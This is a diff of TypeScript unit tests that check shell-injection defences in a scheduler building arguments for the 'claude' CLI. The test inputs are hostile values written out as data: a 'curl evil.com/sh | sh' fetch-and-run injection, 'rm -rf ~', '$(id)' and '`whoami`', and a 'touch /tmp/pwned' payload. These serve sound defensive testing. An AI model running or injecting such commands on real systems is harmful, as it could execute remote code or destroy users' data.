@@ -4,10 +4,16 @@ import assert from 'node:assert/strict';
 import { buildScheduleArgs } from '../src/domain/schedule/schedule';
 import { posixQuote, quoteArgvForShell } from '../src/domain/shell/quoting';
 
+const EVIL = 'x"; curl evil.com/sh | sh; echo "';
+
 test('buildScheduleArgs returns argv array, not a shell string', () => {
-  const claudeArgs = buildScheduleArgs('session-123', {
-    cli: { model: 'sonnet-4-6', 'allowed-tools': 'Read,Bash' },
-  });
+  /* Given */
+  const schedule = { cli: { model: 'sonnet-4-6', 'allowed-tools': 'Read,Bash' } };
+
+  /* When */
+  const claudeArgs = buildScheduleArgs('session-123', schedule);
+
+  /* Then */
   assert.ok(Array.isArray(claudeArgs));
   assert.ok(claudeArgs.includes('--resume'));
   assert.ok(claudeArgs.includes('session-123'));
@@ -16,67 +22,100 @@ test('buildScheduleArgs returns argv array, not a shell string', () => {
 });
 
 test('buildScheduleArgs preserves injection attempts as literal argv tokens (no shell interpretation)', () => {
-  const evil = 'x"; curl evil.com/sh | sh; echo "';
-  const claudeArgs = buildScheduleArgs('sess', {
-    cli: { model: evil },
-  });
+  /* Given */
+  const schedule = { cli: { model: EVIL } };
+
+  /* When */
+  const claudeArgs = buildScheduleArgs('sess', schedule);
+
+  /* Then */
   const idx = claudeArgs.indexOf('--model');
   assert.ok(idx >= 0);
   // The evil string is a single argv token — no splitting, no interpretation.
-  assert.equal(claudeArgs[idx + 1], evil);
+  assert.equal(claudeArgs[idx + 1], EVIL);
 });
 
 test('buildScheduleArgs rejects max-budget-usd that is not a number', () => {
-  assert.throws(() => {
-    buildScheduleArgs('sess', { cli: { 'max-budget-usd': '1; rm -rf ~' } });
-  }, /max-budget-usd/);
+  /* When */
+  const act = () => buildScheduleArgs('sess', { cli: { 'max-budget-usd': '1; rm -rf ~' } });
+
+  /* Then */
+  assert.throws(act, /max-budget-usd/);
 });
 
 test('buildScheduleArgs rejects control characters in scalar fields', () => {
-  assert.throws(() => {
-    buildScheduleArgs('sess', { cli: { model: 'foo\x00bar' } });
-  }, /unsafe characters/);
+  /* When */
+  const act = () => buildScheduleArgs('sess', { cli: { model: 'foo\x00bar' } });
+
+  /* Then */
+  assert.throws(act, /unsafe characters/);
 });
 
-test('buildScheduleArgs allows newlines in append-system-prompt but rejects control chars', () => {
+test('buildScheduleArgs allows newlines in append-system-prompt', () => {
+  /* Given */
   const withNewlines = 'line 1\nline 2\nline 3';
-  const claudeArgs = buildScheduleArgs('sess', {
-    cli: { 'append-system-prompt': withNewlines },
-  });
+
+  /* When */
+  const claudeArgs = buildScheduleArgs('sess', { cli: { 'append-system-prompt': withNewlines } });
+
+  /* Then */
   const idx = claudeArgs.indexOf('--append-system-prompt');
   assert.equal(claudeArgs[idx + 1], withNewlines);
+});
 
-  assert.throws(() => {
-    buildScheduleArgs('sess', { cli: { 'append-system-prompt': 'bad\x01stuff' } });
-  }, /unsafe characters/);
+test('buildScheduleArgs rejects control chars in append-system-prompt', () => {
+  /* When */
+  const act = () => buildScheduleArgs('sess', { cli: { 'append-system-prompt': 'bad\x01stuff' } });
+
+  /* Then */
+  assert.throws(act, /unsafe characters/);
 });
 
 test('posixQuote neutralizes bash injection', () => {
-  const evil = 'x"; curl evil.com/sh | sh; echo "';
-  const quoted = posixQuote(evil);
+  /* When */
+  const quoted = posixQuote(EVIL);
+
+  /* Then */
   // Single-quoted, so the shell passes the whole thing as one arg.
   assert.ok(quoted.startsWith("'"));
   assert.ok(quoted.endsWith("'"));
-  // Single quotes in the value are escaped as '\''
+});
+
+test('posixQuote escapes single quotes in the value', () => {
+  /* When */
   const withQuote = posixQuote("it's");
+
+  /* Then */
+  // Single quotes in the value are escaped as '\''
   assert.equal(withQuote, "'it'\\''s'");
 });
 
 test('posixQuote handles backticks and $() — these must not be evaluated', () => {
-  const evil = '`whoami`';
-  const quoted = posixQuote(evil);
-  assert.equal(quoted, "'`whoami`'");
+  /* Given */
+  const cases: Array<[string, string]> = [
+    ['`whoami`', "'`whoami`'"],
+    ['$(id)', "'$(id)'"],
+  ];
 
-  const dollar = '$(id)';
-  assert.equal(posixQuote(dollar), "'$(id)'");
+  for (const [evil, expected] of cases) {
+    /* When */
+    const quoted = posixQuote(evil);
+
+    /* Then */
+    assert.equal(quoted, expected);
+  }
 });
 
 test('quoteArgvForShell joins multiple args with spaces, each safely quoted', () => {
+  /* When */
   const joined = quoteArgvForShell(['--model', 'x"; evil', '--flag']);
+
+  /* Then */
   assert.equal(joined, "'--model' 'x\"; evil' '--flag'");
 });
 
 test('full simulated schedule command is safe under a malicious frontmatter', () => {
+  /* Given */
   const evilSchedule = {
     cli: {
       'permission-mode': 'acceptEdits',
@@ -86,9 +125,11 @@ test('full simulated schedule command is safe under a malicious frontmatter', ()
       'add-dirs': '/tmp,/etc; touch /tmp/pwned',
     },
   };
-  const claudeArgs = buildScheduleArgs('sess-id', evilSchedule);
-  const cmd = 'claude ' + quoteArgvForShell(claudeArgs);
 
+  /* When */
+  const cmd = 'claude ' + quoteArgvForShell(buildScheduleArgs('sess-id', evilSchedule));
+
+  /* Then */
   // Walk the command and extract only the text outside single-quoted tokens.
   // If any shell metacharacter appears in that "outside" text, injection leaked.
   let outside = '';
